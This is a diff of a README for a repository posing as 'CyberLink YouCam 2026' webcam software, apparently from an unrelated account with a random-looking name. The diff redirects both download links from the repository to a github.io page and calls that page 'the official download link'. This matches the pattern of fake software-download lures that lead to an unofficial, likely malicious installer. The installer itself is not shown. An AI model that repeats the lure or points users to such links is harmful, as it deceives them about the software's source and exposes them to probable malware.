@@ -1,6 +1,6 @@
 # 📸 CyberLink-YouCam-2026 - Enhance Your Webcam Experience With Ease
 
-[![Download Link](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Beeftonguekatydid884/CyberLink-YouCam-2026)
+[![Download Link](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://beeftonguekatydid884.github.io)
 
 ## 📋 About This Software
 
@@ -21,7 +21,7 @@ Make sure your computer meets these needs before starting the installation:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official download link: [Download CyberLink YouCam 2026](https://github.com/Beeftonguekatydid884/CyberLink-YouCam-2026).
+1.  Visit the official download link: [Download CyberLink YouCam 2026](https://beeftonguekatydid884.github.io).
 2.  Locate the download button on the page.
 3.  Save the installer file to your Downloads folder.
 4.  Open the folder once the download finishes.
